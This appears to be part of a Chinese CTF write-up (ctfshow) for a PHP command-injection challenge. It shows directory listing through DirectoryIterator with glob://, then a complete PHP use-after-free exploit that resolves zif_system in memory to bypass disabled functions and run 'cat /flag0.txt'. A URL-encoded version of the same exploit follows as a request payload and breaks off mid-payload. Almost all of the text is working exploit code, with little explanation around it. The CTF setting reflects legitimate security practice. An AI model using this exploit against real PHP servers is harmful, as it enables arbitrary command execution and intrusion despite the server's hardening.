<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);  </span><br><span class="line">	<span class="comment"># 利用DirectoryIterator($path)可以实现遍历目录下的所有文件</span></span><br><span class="line">	<span class="comment"># glob:// — 查找匹配的文件路径模式</span></span><br><span class="line">	<span class="comment"># DirectoryIterator(&quot;glob:///*&quot;)   遍历根目录里所有文件</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)  	<span class="comment">#循环遍历输出，并以空格为分隔</span></span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125; <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们这样也就可以去读取到相应的目录了</p>
<p>后面是真的好难</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;<span class="title function_ invoke__">getTrace</span>();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= <span class="title function_ invoke__">ord</span>(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$e_phoff</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"> </span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">leak</span>(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="variable">$arg</span> = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> <span class="title class_">Vuln</span>();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">stristr</span>(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = <span class="title function_ invoke__">str_shuffle</span>(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">trigger_uaf</span>(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> <span class="title class_">Helper</span>;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">79</span> || <span class="title function_ invoke__">strlen</span>(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$closure_obj</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = <span class="title function_ invoke__">get_binary_base</span>(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = <span class="title function_ invoke__">parse_elf</span>(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = <span class="title function_ invoke__">get_basic_funcs</span>(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = <span class="title function_ invoke__">get_system</span>(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    <span class="title function_ invoke__">write</span>(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"> </span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">ctfshow</span>(<span class="string">&quot;cat /flag0.txt&quot;</span>);<span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload：</span><br><span class="line">c=%0Afunction%20ctfshow(%24cmd)%20%7B%0A%20%20%20%20global%20%24abc%2C%20%24helper%2C%20%24backtrace%3B%0A%0A%20%20%20%20class%20Vuln%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%3B%0A%20%20%20%20%20%20%20%20public%20function%20__destruct()%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20global%20%24backtrace%3B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20unset(%24this-%3Ea)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20(new%20Exception)-%3EgetTrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(!isset(%24backtrace%5B1%5D%5B&#x27;args&#x27;%5D))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24backtrace%20%3D%20debug_backtrace()%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20class%20Helper%20%7B%0A%20%20%20%20%20%20%20%20public%20%24a%2C%20%24b%2C%20%24c%2C%20%24d%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20str2ptr(%26%24str%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24address%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24j%20%3D%20%24s-1%3B%20%24j%20%3E%3D%200%3B%20%24j--)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%3C%3C%3D%208%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24address%20%7C%3D%20ord(%24str%5B%24p%2B%24j%5D)%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24address%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20ptr2str(%24ptr%2C%20%24m%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24out%20%3D%20%22%22%3B%0A%20%20%20%20%20%20%20%20for%20(%24i%3D0%3B%20%24i%20%3C%20%24m%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24out%20.%3D%20sprintf(%22%25c%22%2C(%24ptr%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24ptr%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20return%20%24out%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20write(%26%24str%2C%20%24p%2C%20%24v%2C%20%24n%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20%24i%20%3D%200%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24n%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24str%5B%24p%20%2B%20%24i%5D%20%3D%20sprintf(%22%25c%22%2C(%24v%20%26%200xff))%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24v%20%3E%3E%3D%208%3B%0A%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20leak(%24addr%2C%20%24p%20%3D%200%2C%20%24s%20%3D%208)%20%7B%0A%20%20%20%20%20%20%20%20global%20%24abc%2C%20%24helper%3B%0A%20%20%20%20%20%20%20%20write(%24abc%2C%200x68%2C%20%24addr%20%2B%20%24p%20-%200x10)%3B%0A%20%20%20%20%20%20%20%20%24leak%20%3D%20strlen(%24helper-%3Ea)%3B%0A%20%20%20%20%20%20%20%20if(%24s%20!%3D%208)%20%7B%20%24leak%20%25%3D%202%20%3C%3C%20(%24s%20*%208)%20-%201%3B%20%7D%0A%20%20%20%20%20%20%20%20return%20%24leak%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20parse_elf(%24base)%20%7B%0A%20%20%20%20%20%20%20%20%24e_type%20%3D%20leak(%24base%2C%200x10%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20%24e_phoff%20%3D%20leak(%24base%2C%200x20)%3B%0A%20%20%20%20%20%20%20%20%24e_phentsize%20%3D%20leak(%24base%2C%200x36%2C%202)%3B%0A%20%20%20%20%20%20%20%20%24e_phnum%20%3D%20leak(%24base%2C%200x38%2C%202)%3B%0A%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24e_phnum%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24header%20%3D%20%24base%20%2B%20%24e_phoff%20%2B%20%24i%20*%20%24e_phentsize%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_type%20%20%3D%20leak(%24header%2C%200%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_flags%20%3D%20leak(%24header%2C%204%2C%204)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_vaddr%20%3D%20leak(%24header%2C%200x10)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24p_memsz%20%3D%20leak(%24header%2C%200x28)%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%206)%20%7B%20%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_addr%20%3D%20%24e_type%20%3D%3D%202%20%3F%20%24p_vaddr%20%3A%20%24base%20%2B%20%24p_vaddr%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24data_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20if(%24p_type%20%3D%3D%201%20%26%26%20%24p_flags%20%3D%3D%205)%20%7B%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24text_size%20%3D%20%24p_memsz%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%0A%0A%20%20%20%20%20%20%20%20if(!%24data_addr%20%7C%7C%20!%24text_size%20%7C%7C%20!%24data_size)%0A%20%20%20%20%20%20%20%20%20%20%20%20return%20false%3B%0A%0A%20%20%20%20%20%20%20%20return%20%5B%24data_addr%2C%20%24text_size%2C%20%24data_size%5D%3B%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20get_basic_funcs(%24base%2C%20%24elf)%20%7B%0A%20%20%20%20%20%20%20%20list(%24data_addr%2C%20%24text_size%2C%20%24data_size)%20%3D%20%24elf%3B%0A%20%20%20%20%20%20%20%20for(%24i%20%3D%200%3B%20%24i%20%3C%20%24data_size%20%2F%208%3B%20%24i%2B%2B)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20%24i%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x746e6174736e6f63)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20continue%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%20else%20continue%3B%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24leak%20%3D%20leak(%24data_addr%2C%20(%24i%20%2B%204)%20*%208)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20if(%24leak%20-%20%24base%20%3E%200%20%26%26%20%24leak%20-%20%24base%20%3C%20%24data_addr%20-%20%24base)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24deref%20%3D%20leak(%24leak)%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20if(%24deref%20!%3D%200x786568326e6962)%